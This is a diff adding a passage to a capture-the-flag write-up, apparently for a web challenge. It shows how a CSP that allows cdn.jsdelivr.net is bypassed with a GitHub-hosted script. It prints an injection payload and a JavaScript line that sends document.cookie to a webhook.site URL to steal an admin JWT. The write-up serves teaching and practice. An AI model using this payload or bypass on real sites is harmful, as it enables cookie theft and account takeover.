@@ -137,15 +137,40 @@ app.use(function (req, res, next) {
     );
     next();
 });
-
 ```
 
+This can be very troublesome. Any browser visiting this web application would look at the `script-src` directive of the CSP header and decide which JavaScript is safe to load and which is not. For example, any inline injected JavaScript code would not get executed because there's no `inline` parameter in the `script-src` directive. It won't load any JavaScript hosted on the attacker's domain either.
 
+The only allowed parameters in the `script-src` directive are self and `https://cdn.jsdelivr.net`. The self parameter means that the JavaScript `files hosted under the same domain as of the application` are safe to load. `The https://cdn.jsdelivr.net` parameter means that any JavaScript files hosted on `https://cdn.jsdelivr.net` are also safe to load.
 
+The problem with this policy is that literally anyone can host `JavaScript` files on `https://cdn.jsdelivr.net`. To host your JavaScript files on `https://cdn.jsdelivr.net`, simply create a public GitHub repository and host your JavaScript files in there. Then you can format the `https://cdn.jsdelivr.net` in a way that it would dynamically pull the JavaScript file from your GitHub repository. The format of the `https://cdn.jsdelivr.net` should be as follows:
 
+```
+https://cdn.jsdelivr.net/gh/<github_username>/<repository_name>/<file_name>.js
+```
 
+In my case, I created a [public GitHub repository](https://github.com/darshannn10/cursed-web-party-payload/blob/main/xss-poc.js) and hosted a file xss-poc.js in there. So for me, this is what the URL looks like:
 
+```
+https://cdn.jsdelivr.net/gh/darshannn10/cursed-web-party-payload/xss-poc.js
+```
 
+This `xss.poc` gets the cookies and submits them to my [webhook.site](https://webhook.site/).
+```javascript
+var i = new Image;i.src="https://webhook.site/70c3e906-3fe0-46de-95f9-045b725a9d6b"+document.cookie;
+```
 
+Next, I inject the following payload in the `halloween_name` parameter in the `/api/submit` request which first closes the div tag and then add our script from the github.
 
+```
+</div><script src=\"https://cdn.jsdelivr.net/gh/darshannn10/cursed-web-party-payload/xss-poc.js\"></script>
+```
 
+![cwp](https://user-images.githubusercontent.com/87711310/213440655-d0e9d878-2a78-4f32-963d-2b832dd27cda.png)
+
+After I sent the request, I immediately got the query strings on my webhook client which contained cookie values.
+
+![cwp-1](https://user-images.githubusercontent.com/87711310/213442351-708d2b79-6c0d-4de5-98fb-eb09fba25e40.png)
+
+Decoding the admin JWT, we get the flag.
+![cwp-2](https://user-images.githubusercontent.com/87711310/213442345-a1ec79f7-dcec-4d6f-a5f2-ad0ae1df8e90.png)
